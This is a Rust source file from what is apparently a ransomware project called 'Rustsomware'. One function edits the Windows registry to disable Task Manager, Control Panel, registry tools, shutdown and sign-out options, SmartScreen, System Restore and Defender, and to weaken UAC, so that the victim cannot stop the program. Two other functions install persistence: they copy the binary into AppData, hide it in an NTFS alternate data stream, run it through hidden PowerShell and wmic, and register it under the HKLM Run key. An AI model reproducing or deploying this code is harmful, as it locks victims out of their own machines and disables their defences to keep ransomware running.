use dirs;
use mslnk::ShellLink;
use std::fs;
use std::path::Path;
use std::process::Command;
use winreg;
use winreg::enums::*;
use winreg::RegKey;

pub fn lock_down_system() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value("DisableChangePassword", &1u32);
    key.set_value("DisableLockWorkstation", &1u32);
    key.set_value("DisableTaskMgr", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value("HidePowerOptions", &1u32);
    key.set_value("NoControlPanel", &1u32);
    key.set_value("NoRun", &1u32);

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("HideFastUserSwitching", &1u32);
    // disables UAC so it's not required after reboot, making it so the user can't avoid the script that easily to run on startup at max power.
    key.set_value("PromptOnSecureDesktop", &0u32);
    key.set_value("EnableLUA", &1u32);
    key.set_value("ConsentPromptBehaviorAdmin", &0u32);
    key.set_value("ValidateAdminCodeSignatures", &0u32);
    key.set_value("FilterAdministratorToken", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("HidePowerOptions", &1u32);
    key.set_value("NoControlPanel", &1u32);
    key.set_value("NoRun", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Search\\AllowFindMyFiles");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowEditDeviceName");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowLanguage");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowPowerSleep");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowSignInOptions");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowYourAccount");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\EnableAppInstallControl",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\EnableSmartScreenInShell",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\PreventOverrideForFilesInShell",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\DisableContextMenus");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideAppList");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideChangeAccountSettings");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideFrequentlyUsedApps");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideHibernate");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideLock");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HidePeopleBar");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HidePowerButton");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRecentJumplists");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRecentlyAddedApps");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRestart");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideShutDown");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSignOut");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSleep");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSwitchAccount");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideUserTile");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\NoPinningToTaskbar");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDeviceDelete");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDiagnosticDataViewer",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDirectXDatabaseUpdate",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableEnterpriseAuthProxy",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableSystemRestore");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\TaskManager\\AllowEndTask");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableAccountProtectionUI",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableDeviceSecurityUI",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableNetworkUI",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableVirusUI",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisallowExploitProtectionOverride",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\HideRansomwareDataRecovery",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\HideSecureBoot",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsLogon\\DontDisplayNetworkSelectionUI",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsLogon\\HideFastUserSwitching",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("DisableAntiSpyware", &1u32);

    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value("DisableRegistryTools", &1u32);
}

pub fn start_ransomware_on_startup_classic() {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    let run = hklm
        .open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
        .unwrap();

    // Check if program is not already in startup, if is not goes on
    match run.get_value::<String, String>(String::from("Rustsomware")) {
        Ok(_) => return,
        Err(_) => (),
    };

    let exec_name = match get_exec_name() {
        Some(name) => name,
        None => return,
    };

    // Copy the program to a different path
    match get_home_dir() {
        Some(dir) => {
            let destination = dir.clone() + "\\AppData\\Roaming\\Cache\\";
            let target = dir.clone() + "\\AppData\\Roaming\\Cache\\" + &exec_name;
            let lnk = target.clone() + ".lnk";
            match fs::create_dir(&destination) {
                Ok(_) => (),
                Err(_) => {
                    fs::remove_dir_all(&destination);
                    fs::create_dir(&destination);
                    ()
                }
            }
            match fs::copy(&exec_name, &target) {
                Ok(_) => match ShellLink::new(&target) {
                    Ok(sl) => {
                        sl.create_lnk(&lnk);
                        key.set_value("Rustsomware", &("\"".to_owned() + &lnk + "\""));
                    }
                    Err(_) => (),
                },
                Err(_) => (),
            }
        }
        None => (),
    }
}

pub fn start_ransomware_on_startup_alternate_data_stream() {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    let run = hklm
        .open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
        .unwrap();

    // Check if program is not already in startup, if is not goes on
    match run.get_value::<String, String>(String::from("Rustsomware")) {
        Ok(_) => return,
        Err(_) => (),
    };

    let exec_name = match get_exec_name() {
        Some(name) => name,
        None => return,
    };

    // Copy the program to a different path
    match get_home_dir() {
        Some(dir) => {
            let ads_folder = dir.clone() + "\\AppData\\Roaming\\Cache";
            let ads_exe = dir.clone() + "\\AppData\\Roaming\\Cache:default_id";

            match fs::create_dir(&ads_folder) {
                Ok(_) => (),
                Err(_) => {
                    println!("Error creating dir cache!");
                    start_ransomware_on_startup_classic();
                    return;
                }
            }

            let destination = dir.clone() + "\\AppData\\Roaming\\rustsomware\\";
            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\" + &exec_name;
            match fs::create_dir(&destination) {
                Ok(_) => (),
                Err(_) => {
                    fs::remove_dir_all(&destination);
                    fs::create_dir(&destination);
                    ()
                }
            }

            let mut startup_command =
                "cmd /c start /min cmd /c powershell -W Hidden -C \"(expand ".to_string();
            startup_command.push_str(&(String::from("'\"") + &ads_exe + "\"'"));
            startup_command.push_str(&" ");
            startup_command.push_str(&(String::from("'\"") + &dir + "\\" + &exec_name + "\"'"));
            startup_command.push_str(&") -and (wmic process call create '\"");
            startup_command.push_str(&(dir.clone() + "\\" + &exec_name + "\"'"));
            startup_command.push_str(&")\"");

            match fs::copy(&exec_name, &target) {
                Ok(_) => {
                    let command = format!(
                        "Start-Process \"cmd.exe\" '/c type \"{}\" > \"{}\"' -NoNewWindow",
                        &target, &ads_exe
                    );
                    match Command::new("cmd")
                        .args([
                            "/c",
                            "start",
                            "/min",
                            "cmd",
                            "/c",
                            "powershell",
                            "-WindowStyle",
                            "Hidden",
                            "-NonInteractive",
                            "-NoLogo",
                            "-Command",
                            &command,
                        ])
                        .spawn()
                    {
                        Ok(_) => {
                            key.set_value("Rustsomware", &startup_command);
                        }
                        Err(_) => {
                            start_ransomware_on_startup_classic();
                            return;
                        }
                    }
                }
                Err(_) => {
                    start_ransomware_on_startup_classic();
                    return;
                }
            }
        }
        None => (),
    }
}

fn get_home_dir() -> Option<String> {
    match dirs::home_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => Some(path_str.to_owned()),
            None => None,
        },
        None => None,
    }
}

pub fn get_exec_name() -> Option<String> {
    std::env::current_exe()
        .ok()
        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
        .and_then(|s| s.into_string().ok())
}
